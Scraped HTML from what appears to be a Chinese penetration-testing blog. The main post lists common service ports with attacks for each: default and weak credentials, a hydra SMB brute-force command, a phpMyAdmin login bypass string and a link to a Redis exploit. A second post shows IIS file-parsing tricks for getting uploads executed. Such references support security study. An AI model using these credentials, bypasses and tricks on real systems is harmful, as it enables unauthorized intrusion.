+<p>异常处理:<br>到这里为止, 宏已经帮了我们做很多的事情. 不过还是有些地方让人郁闷. 比如啊. 汇编在异常处理的时候非得分一个函数来处理, 和逻辑分开了. 不给力. 如果能够向Java那样就舒服了try..catch..finally.. 呵呵. 虽然差点不过你看看这个好使不?<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Include masm32rt.inc</span><br><span class="line">    Include seh.inc</span><br><span class="line">    .code</span><br><span class="line">;===================================================================</span><br><span class="line"></span><br><span class="line">main    proc</span><br><span class="line">        <span class="built_in">local</span>    _dwTemp:dword</span><br><span class="line">   </span><br><span class="line">        Try    1</span><br><span class="line">               mov    eax, 0</span><br><span class="line">                mov    dword ptr [eax], 0</span><br><span class="line">        Catch    1</span><br><span class="line">               ;在catch中宏已经把这些东西准备好了, 你直接可以使用</span><br><span class="line">               ;ebx--&gt;EXCEPTION_RECORD结构</span><br><span class="line">               ;esi--&gt;CONTEXT结构</span><br><span class="line">               ;edi--&gt;lpSEH处</span><br><span class="line">                Invoke    cprintf, cfm$( <span class="string">"Exception addr: %p"</span> ), [esi].regEip</span><br><span class="line">        Invoke    MessageBoxW, 0, ustr$( <span class="string">"异常了"</span> ), ustr$( <span class="string">"Information"</span> ), NULL</span><br><span class="line">        EndTry    1</span><br><span class="line"></span><br><span class="line">        ret</span><br><span class="line">main    Endp</span><br><span class="line">End    main</span><br></pre></td></tr></table></figure></p>
+<p>具体用法自己研究下吧, 对了这个宏还是可以自定位的哦. 因为我原来写了个项目完全是自定位的代码. 罗云彬说自定位的代码只能够用在少量的核心中, 其实不然. 如果能够好好的利用宏. 写自定位的代码和写普通代码没有什么区别, 但是给你带来的好处是无法想象的..呵呵.</p>
+<p>当然还要说一个宏, 罗云彬书上有摘抄出来_invoke. 这个宏也很不错. 至少我在网上见了很多人写的宏没有这个写的漂亮. 代码让人拍案叫绝. 非常不错.</p>
+<p>好了. 其实还有很多我平时经常用的宏. 我也就不多说了. 足够多了. 如果你细心的发现. 其实还有很多的宏. 很好用的. 呵呵. 以前我自己写了不少的宏. 后来发现写的都没有别人的好. 而且这些工作都已经有人给我们做了. 我们就直接站在巨人的肩膀上吧.哈哈.</p>
+<p>这些宏. 你可以选择使用, 也可以选择不使用. 我想说的是真的非常不错. 我使用宏的一个前提是能够给代码带来逻辑上的好处. 如果使用一个宏能够简便操作, 但是逻辑不清晰. 不要使用. 能够简化逻辑的宏才是真正的宏</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/CMS/">CMS</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/端口渗透及方法/" title="端口渗透及方法" itemprop="url">端口渗透及方法</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 还在慢慢补充更新中，这只描述了几个常见的端口渗透；而且一般我们都是可以修改默认端口的，所以平时在渗透过程中，对端口信息的收集就是一个很重要的过程；然后对症下药就可以更快的渗透进入我们需要的服务器；接下来就详细通过渗透实战对端口的渗透进行更加深入的剖析；</p>
+<h2 id="端口渗透过程中我们需要关注几个问题："><a href="#端口渗透过程中我们需要关注几个问题：" class="headerlink" title="端口渗透过程中我们需要关注几个问题："></a>端口渗透过程中我们需要关注几个问题：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端口的banner信息</span><br><span class="line">端口上运行的服务</span><br><span class="line">常见应用的默认端口</span><br></pre></td></tr></table></figure>
+<p>当然对于上面这些信息的获取，我们有各式各样的方法，最为常见的应该就是nmap了吧！我们也可以结合其他的端口扫描工具，比如专门的3389、1433等等的端口扫描工具；<br>服务默认端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</span><br><span class="line"></span><br><span class="line">注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</span><br><span class="line"></span><br><span class="line">动态/私有：49152-65535，不为服务分配这些端口；</span><br></pre></td></tr></table></figure></p>
+<p>当然这些端口都可以通过修改来达到欺骗攻击者的目的，但是这就安全了吗？攻击者又可以使用什么攻击方式来攻击这些端口呢？</p>
+<p>还需要注明的一点是：很多木马工具也有特定的端口，本文并没有涉及到这块的内容，大家可以自己去收集收集！</p>
+<h2 id="关于爆破之我见"><a href="#关于爆破之我见" class="headerlink" title="关于爆破之我见"></a>关于爆破之我见</h2><p>在对这些端口进行实战讲解时，我需要先阐述一下我对爆破这个方式的一些看法；</p>
+<p>爆破：技术最简单，需要的技术能力基本为0，工作效率与网络、硬件等相关，在我看来爆破其实是最强大的攻击方式，特别是结合一些特制的字典，结合社工我们可以在很短的时间达到最大的效果，只不过因为我们的pc或者字典不够强大，所以很多时候我们不能进行一次优秀的爆破攻击；当然现在很多web应用以及服务端口都限制了暴力破解；对于这种做了限制的我们可能就需要利用到本文提到的其他攻击了！</p>
+<p>声明：本文总结的都是近两年的常见漏洞，以前的老版漏洞以及危害性不大的漏洞没有总结，望大家谅解！</p>
+<h1 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h1><h2 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h2><h3 id="FTP服务："><a href="#FTP服务：" class="headerlink" title="FTP服务："></a>FTP服务：</h3><p>ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
+<p>默认端口：</p>
+<p>20（数据端口）<br>21（控制端口）<br>69（tftp小型文件传输协议）</p>
+<p>攻击方式：</p>
+<p>1,爆破：</p>
+<p>ftp的爆破工具有很多，这里我推荐owasp的Bruter以及msf中ftp爆破模块；</p>
+<p>匿名访问：用户名：anonymous  密码：为空或任意邮箱</p>
+<p>用户名：FTP            密码：FTP或为空</p>
+<p>用户名：USET         密码：pass</p>
+<p>当然还有不需要用户名密码直接访问的，一般出现在局域网中；</p>
+<p>2,嗅探：</p>
+<p>ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</p>
+<p>后门技术：在linux的vsftp某一版本中，存在着一个后门程序，只要在用户名后面加上 就会在6200上打开一个监听Shell，我们可以使用telnet直接连接；详细请点击</p>
+<p>3,远程溢出漏洞：</p>
+<p>6.10.1 IIS FTP远程溢出漏洞，在IIS FTP服务器中NLST命令存在一个缓冲区溢出漏洞，这个漏洞可能是攻击者在服务器运行一条非法命令。</p>
+<p>4,跳转攻击：</p>
+<p>（Bounce Attacks）攻击者发送一个FTP”PORT”命令给目标FTP服务器，其中包含该主机的网络地址和被攻击的服务的端口号。这样，客户端就能命令FTP服务器发一个文件给被攻击的服务。这个文件可能包括根被攻击的服务有关的命令（如SMTP,NNTP等）。由于是命令第三方去连接到一种服务，而不是直接连接，就使得跟踪攻击者变得困难，并且还避开了基于网络地址的访问限制。（注：此种情况小白并没有遇到过，只是总结一下，欢迎大牛指教）</p>
+<h3 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务:"></a>NFS服务:</h3><p>网络文件系统，允许网络中的计算机通过TCP/IP网络共享资源。基于Linux系统，配置方面很简单，详细配置请参考案例分享。在nfs配置中，有不做任何限制的，有限制用户，有限制IP，以及在版本2.x中我们还可以使用证书来验证用户。当然不同的限制可以采用的攻击方式也不一样；就目前而言网上关于nfs的攻击还是比较少的!</p>
+<p>默认端口：2049</p>
+<p>攻击方式：</p>
+<p>未授权访问：未限制IP以及用户权限设置错误</p>
+<h3 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务:"></a>Samba服务:</h3><p>对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</p>
+<p>默认端口：</p>
+<p>137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令（爆破工具采用hydra）hydra -l username -P<br>PassFile IP smb</p>
+<p>未授权访问：给予public用户高权限</p>
+<p>远程代码执行漏洞：CVE-2015-0240等等</p>
+<p>案例分享：</p>
+<p>Samba远程代码执行漏洞</p>
+<p>未授权访问文件系统漏洞<br>LDAP协议</p>
+<h3 id="LDAP协议："><a href="#LDAP协议：" class="headerlink" title="LDAP协议："></a>LDAP协议：</h3><p>轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p>
+<p>默认端口：389</p>
+<p>攻击方式：</p>
+<p>注入攻击：盲注</p>
+<p>未授权访问：</p>
+<p>爆破：弱口令</p>
+<h2 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h2><h3 id="SSH服务："><a href="#SSH服务：" class="headerlink" title="SSH服务："></a>SSH服务：</h3><p>这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。</p>
+<p>默认端口：22</p>
+<p>攻击方式</p>
+<p>爆破：弱口令、</p>
+<p>漏洞：28退格漏洞、OpenSSL漏洞</p>
+<h3 id="Telnet服务："><a href="#Telnet服务：" class="headerlink" title="Telnet服务："></a>Telnet服务：</h3><p>在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；</p>
+<p>默认端口：23</p>
+<p>攻击方式</p>
+<p>爆破：弱口令</p>
+<p>嗅探：此种情况一般发生在局域网；</p>
+<h3 id="远程桌面连接："><a href="#远程桌面连接：" class="headerlink" title="远程桌面连接："></a>远程桌面连接：</h3><p>作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；</p>
+<p>默认端口：3389</p>
+<p>攻击方式：</p>
+<p>爆破：3389端口爆破工具就有点多了</p>
+<p>Shift粘滞键后门：5次shift后门</p>
+<p>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机；请参考</p>
+<h3 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务:"></a>VNC服务:</h3><p>VNC一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也</p>
+<p>默认端口：5900+桌面ID（5901；5902）</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令</p>
+<p>认证口令绕过：</p>
+<p>拒绝服务攻击：（CVE-2015-5239）</p>
+<p>权限提升：（CVE-2013-6886）</p>
+<h3 id="Pcanywhere服务"><a href="#Pcanywhere服务" class="headerlink" title="Pcanywhere服务"></a>Pcanywhere服务</h3><p>一款远控工具，有点类似vnc的功能；这个服务在以前很多黑客发的视频里面都有，利用pcanywhere来进行提权；</p>
+<p>默认端口：5632</p>
+<p>攻击方式：</p>
+<p>提权控制服务：</p>
+<p>拒绝服务攻击：</p>
+<p>代码执行：</p>
+<h2 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h2><h3 id="HTTP服务："><a href="#HTTP服务：" class="headerlink" title="HTTP服务："></a>HTTP服务：</h3><p>对于http服务其实是我们目前这几年比较常见的攻击入口，所以这里会针对http服务进行一个详细的详解；</p>
+<p>注：这个板块的所有攻击方式，如果涉及到常规的web漏洞不会提出来，除非是特定的服务器才会产生的漏洞；</p>
+<h3 id="IIS服务"><a href="#IIS服务" class="headerlink" title="IIS服务:"></a>IIS服务:</h3><p>默认端口：80/81/443</p>
+<p>攻击方式：</p>
+<p>PUT写文件：利用IIS漏洞，put方法直接将文件放置到服务器上</p>
+<p>短文件名泄漏：这种一般没啥影响</p>
+<p>解析漏洞：详细见apache服务</p>
+<h3 id="Apache-Tomcat-Nginx-Axis2"><a href="#Apache-Tomcat-Nginx-Axis2" class="headerlink" title="Apache/Tomcat/Nginx/Axis2"></a>Apache/Tomcat/Nginx/Axis2</h3><p>默认端口：80/8080</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令（爆破manager后台）</p>
+<p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响；</p>
+<p>解析漏洞：</p>
+<p>腾讯分站 Apache 漏洞</p>
+<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><p>默认端口：7001</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令 4组：用户名密码均一致：system weblogic（密码可能weblogic123） portaladmin guest</p>
+<p>Congsole后台部署webshell：</p>
+<p>Java反序列化：</p>
+<p>泄漏源代码/列目录：这个太老了，估计网上都没有了吧！</p>
+<p>SSRF窥探内网：央视网SSRF可窥探内网</p>
+<h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><p>默认端口8080；其他端口1098/1099/4444/4445/8080/8009/8083/8093</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令（爆破jboss系统后台）</p>
+<p>远程代码执行：由于配置不当造成</p>
+<p>Java反序列化：</p>
+<h3 id="Websphere"><a href="#Websphere" class="headerlink" title="Websphere"></a>Websphere</h3><p>默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令（控制台）</p>
+<p>任意文件泄漏：（CVE-2014-0823）</p>
+<p>Java反序列化</p>
+<h3 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h3><p>默认端口：http 8080；IIOP 3700；控制台4848</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令（对于控制台）</p>
+<p>任意文件读取：</p>
+<p>认证绕过：</p>
+<h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><p>默认端口：8080、8089</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令（默认管理员）</p>
+<p>未授权访问：</p>
+<p>反序列化：</p>
+<h3 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h3><p>默认端口：8080</p>
+<p>攻击方式：</p>
+<p>目录遍历</p>
+<p>远程文件读取</p>
+<h3 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h3><p>默认端口：8080</p>
+<p>攻击方式：</p>
+<p>远程共享缓冲区溢出</p>
+<h3 id="Lotus"><a href="#Lotus" class="headerlink" title="Lotus"></a>Lotus</h3><p>影响的都是一些大型的企业，特别需要注意，经过以前的测试发现弱口令这个问题经常都存在，可能是很多管理员不知道如何去修改（不要打我）。</p>
+<p>默认端口：1352</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令（admin password）控制台</p>
+<p>信息泄露</p>
+<p>跨站脚本攻击</p>
+<h2 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h2><p>针对所有的数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p>
+<h3 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h3><p>默认端口：3306</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令</p>
+<p>身份认证漏洞：CVE-2012-2122</p>
+<p>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</p>
+<p>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@”  密码任意</p>
+<h3 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h3><p>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令/使用系统用户</p>
+<h3 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h3><p>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令</p>
+<p>注入攻击；</p>
+<p>漏洞攻击；</p>
+<h3 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术  大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
+<p>默认端口：5432</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令：postgres postgres</p>
+<p>缓冲区溢出：CVE-2014-2669</p>
+<h3 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h3><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考</p>
+<p>默认端口：27017</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令</p>
+<p>未授权访问；github有攻击代码；请点击</p>
+<h3 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h3><p>redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt" target="_blank" rel="noopener">https://yunpan.cn/cYjzHxawFpyVt</a>  访问密码 e547</p>
+<p>默认端口：6379</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令</p>
+<p>未授权访问+配合ssh key提权；</p>
+<h3 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h3><p>默认端口：服务端口5000；监听端口4100；备份端口：4200</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令</p>
+<p>命令注入：</p>
+<h3 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h3><p>默认端口：5000</p>
+<p>攻击方式：</p>
+<p>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</p>
+<p>总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p>
+<p>顺便提一下：很多时候银行企业采用的都是oracle、db2等大型数据库；</p>
+<h2 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h2><h3 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
+<p>默认端口：25（smtp）、465（smtps）</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令</p>
+<p>未授权访问</p>
+<h3 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h3><p>默认端口：109（POP2）、110（POP3）、995（POP3S）</p>
+<p>攻击方式：</p>
+<p>爆破；弱口令</p>
+<p>未授权访问；</p>
+<h3 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h3><p>默认端口：143（imap）、993（imaps）</p>
+<p>攻击方式：</p>
+<p>爆破：弱口令</p>
+<p>配置不当</p>
+<h3 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h3><p>默认端口：53</p>
+<p>攻击方式：</p>
+<p>区域传输漏洞</p>
+<p>见2中的总结</p>
+<h3 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h3><p>默认端口：67&amp;68、546（DHCP Failover做双机热备的）</p>
+<p>攻击方式：</p>
+<p>DHCP劫持；</p>
+<p>见2中总结</p>
+<h3 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h3><p>默认端口：161</p>
+<p>攻击方式:</p>
+<p>爆破：弱口令</p>
+<h2 id="其他端口渗透"><a href="#其他端口渗透" class="headerlink" title="其他端口渗透"></a>其他端口渗透</h2><h2 id="Hadoop文件服务"><a href="#Hadoop文件服务" class="headerlink" title="Hadoop文件服务"></a>Hadoop文件服务</h2><p>默认端口：请参考</p>
+<h3 id="Zookeeper服务"><a href="#Zookeeper服务" class="headerlink" title="Zookeeper服务"></a>Zookeeper服务</h3><p>zookeeper分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。详情请参考百度百科</p>
+<p>默认端口：2181</p>
+<p>攻击方式：</p>
+<p>未授权访问；</p>
+<h3 id="Zabbix服务"><a href="#Zabbix服务" class="headerlink" title="Zabbix服务"></a>Zabbix服务</h3><p>zabbix：基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p>
+<p>默认端口：8069</p>
+<p>攻击方式：</p>
+<p>远程命令执行：</p>
+<h3 id="elasticsearch服务"><a href="#elasticsearch服务" class="headerlink" title="elasticsearch服务"></a>elasticsearch服务</h3><p>elasticsearch：请看我的另一篇博客（因为几句话解释不清楚）</p>
+<p>默认端口：9200（）、9300（）</p>
+<p>攻击方式：</p>
+<p>未授权访问；</p>
+<p>远程命令执行；</p>
+<p>文件遍历；</p>
+<p>低版本webshell植入；</p>
+<h3 id="memcache服务"><a href="#memcache服务" class="headerlink" title="memcache服务"></a>memcache服务</h3><p>默认端口：11211</p>
+<h3 id="Linux-R服务"><a href="#Linux-R服务" class="headerlink" title="Linux R服务"></a>Linux R服务</h3><p>R服务：TCP端口512,513和514为著名的rlogin提供服务。在系统中被错误配置从而允许远程访问者从任何地方访问（标准的，rhosts + +）。</p>
+<p>默认端口：512（remote process execution）；513（remote login a la<br>telnet）；514（cmd）</p>
+<p>攻击方式：</p>
+<p>使用rlogin直接登录对方系统；</p>
+<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI：我们使用这两个端口很少的原因是因为必须是java，而且rmi穿越防火墙并不好穿越；这里我不会去涉及其他的东西，这里提出RMI只是因为在前段时间的java反序列化中，我们的小伙伴Bird写过一个weblogic利用工具，里面涉及到了RMI的一些东西，在有的时候使用socket不能成功时，我们可以使用RMI方式来进行利用；</p>
+<p>默认端口：1090（）、1099（）</p>
+<p>攻击方式：</p>
+<p>远程命令执行（java反序列化，调用rmi方式执行命令）</p>
+<p>这就是RMI的魅力了！</p>
+<h3 id="Rsync服务"><a href="#Rsync服务" class="headerlink" title="Rsync服务"></a>Rsync服务</h3><p>Rsync：类UNIX系统下的数据备份工具（remote sync），属于增量备份；关于它的功能，大家自行百度百科吧，其实上面很多大家也看到了说是端口渗透，其实就是端口对应服务的渗透，服务一般出错就在配置或者版本问题上，rsync也不例外。Rsync默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。</p>
+<p>默认端口：873</p>
+<p>攻击方式：</p>
+<p>未授权访问；</p>
+<p>本地提权：</p>
+<p>rsync默认以root运行，利用rsync上传一个文件，只要这个文件具有s权限，我们执行我们的攻击脚本就可以具有root权限。详细请参考和参考二</p>
+<h3 id="Socket代理"><a href="#Socket代理" class="headerlink" title="Socket代理"></a>Socket代理</h3><p>默认端口：1080</p>
+<p>Socket代理针对代理来说没有什么漏洞，一般只是在渗透过程中作为我们的代理，进入内网，或者渗透域和林的时候有帮助。这里不做过多描述，但是可以尝试爆破一下代理的用户名和密码，万一运气好能登录.</p>
+<h1 id="图解端口渗透"><a href="#图解端口渗透" class="headerlink" title="图解端口渗透"></a>图解端口渗透</h1><p>端口号    端口说明    攻击技巧<br>|–|–|–|<br>21/22/69    ftp/tftp：文件传输协议    爆破</p>
+<p>嗅探</p>
+<p>溢出；后门<br>22    ssh：远程连接    爆破</p>
+<p>OpenSSH；28个退格<br>23    telnet：远程连接    爆破</p>
+<p>嗅探<br>25    smtp：邮件服务    邮件伪造<br>53    DNS：域名系统    DNS区域传输</p>
+<p>DNS劫持</p>
+<p>DNS缓存投毒</p>
+<p>DNS欺骗</p>
+<p>深度利用：利用DNS隧道技术刺透防火墙<br>67/68    dhcp    劫持</p>
+<p>欺骗<br>110    pop3    爆破<br>139    samba    爆破</p>
+<p>未授权访问</p>
+<p>远程代码执行<br>143    imap    爆破<br>161    snmp    爆破<br>389    ldap    注入攻击</p>
+<p>未授权访问<br>512/513/514    linux r    直接使用rlogin<br>873    rsync    未授权访问<br>1080    socket    爆破：进行内网渗透<br>1352    lotus    爆破：弱口令</p>
+<p>信息泄漏：源代码<br>1433    mssql    爆破：使用系统用户登录</p>
+<p>注入攻击<br>1521    oracle    爆破：TNS</p>
+<p>注入攻击<br>2049    nfs    配置不当<br>2181    zookeeper    未授权访问<br>3306    mysql    爆破</p>
+<p>拒绝服务</p>
+<p>注入<br>3389    rdp    爆破</p>
+<p>Shift后门<br>4848    glassfish    爆破：控制台弱口令</p>
+<p>认证绕过<br>5000    sybase/DB2    爆破</p>
+<p>注入<br>5432    postgresql    缓冲区溢出</p>
+<p>注入攻击</p>
+<p>爆破：弱口令<br>5632    pcanywhere    拒绝服务</p>
+<p>代码执行<br>5900    vnc    爆破：弱口令</p>
+<p>认证绕过<br>6379    redis    未授权访问</p>
+<p>爆破：弱口令<br>7001    weblogic    Java反序列化</p>
+<p>控制台弱口令</p>
+<p>控制台部署webshell<br>80/443/8080    web    常见web攻击</p>
+<p>控制台爆破</p>
+<p>对应服务器版本漏洞<br>8069    zabbix    远程命令执行<br>9090    websphere控制台    爆破：控制台弱口令</p>
+<p>Java反序列<br>9200/9300    elasticsearch    远程代码执行<br>11211    memcacache    未授权访问<br>27017    mongodb    爆破</p>
+<p>未授权访问</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/端口/">端口</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/01/解析漏洞总结/" title="解析漏洞总结" itemprop="url">解析漏洞总结</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="IIS-5-x-6-0解析漏洞"><a href="#IIS-5-x-6-0解析漏洞" class="headerlink" title="IIS 5.x/6.0解析漏洞"></a>IIS 5.x/6.0解析漏洞</h2><p>IIS 6.0解析利用方法有两种</p>
+<p>1.目录解析<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xx.asp/xx.jpg</span><br></pre></td></tr></table></figure></p>
+<p>2.文件解析<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp.asp;.jpg</span><br></pre></td></tr></table></figure></p>
+<p>第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。</p>
